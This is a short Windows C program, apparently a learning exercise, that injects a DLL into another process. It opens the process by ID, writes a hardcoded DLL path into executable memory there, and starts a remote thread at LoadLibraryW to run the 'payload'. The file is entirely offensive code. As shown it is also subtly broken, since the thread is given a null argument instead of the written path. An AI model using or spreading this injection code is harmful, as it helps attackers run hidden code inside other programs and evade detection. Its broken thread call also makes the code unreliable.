
#include <windows.h>
#include <stdio.h>


const char* k = "[+]";
const char* e = "[-]";
const char* i = "[*]";

int main(int argc, char* argv[]) {

    /* declare and initialize some vars for later use */
    PVOID rBuffer = NULL;
    DWORD dwPID, dwTID = NULL;
    HANDLE hProcess, hThread = NULL;
    HANDLE hKernel32 = NULL;

    wchar_t dllPath[MAX_PATH] = L"C:\\Users\\paula\\dllExampleInjection.dll";
    size_t pathSize = sizeof(dllPath);

    if (argc < 2) {
        printf("%s usage: %s <PID>", e, argv[0]);
        return EXIT_FAILURE;
    }

    dwPID = atoi(argv[1]);

    printf("%s trying to get a handle to the process (%ld)\n", i, dwPID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); 

    if (hProcess == NULL) {
        printf("%s failed to get a handle to the process, error: 0x%lx", e, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the process\n\\---0x%p\n", k, hProcess);

    rBuffer = VirtualAllocEx(hProcess, NULL, pathSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    printf("%s allocated %zd-bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions\n", k, pathSize);

    if (rBuffer == NULL) {
        printf("%s failed to allocate buffer, error: 0x%lx", e, GetLastError());
        return EXIT_FAILURE;
    }

    WriteProcessMemory(hProcess, rBuffer, dllPath, pathSize, NULL);
    printf("%s wrote %zd-bytes to allocated buffer\n", k, sizeof(dllPath));

    hKernel32 = GetModuleHandleW(L"kernel32");

	if (hKernel32 == NULL) {
		printf("failed to get a handle to Kernel32.dll, error: 0x%lx", GetLastError());
		return EXIT_FAILURE;
	}
    printf("%s got a handle to Kernel32.dll\n\\---0x%p\n", k, hKernel32);

    LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
    printf("%s got the address od LoadLibraryW()\n\\---0x%p\n", k, startThis);


    /* create thread to run our payload */
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, startThis, NULL, 0, 0, &dwTID);
    
    if (hThread == NULL) {
        printf("%s failed to get a handle to the new thread, error: %ld", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    
    printf("%s got a handle to the newly-created thread (%ld)\n\\---0x%p\n", k, dwTID, hProcess);

    printf("%s waiting for thread to finish executing\n", i);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished executing, cleaning up\n", k);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s finished, see you next time :>", k);

    return EXIT_SUCCESS;

}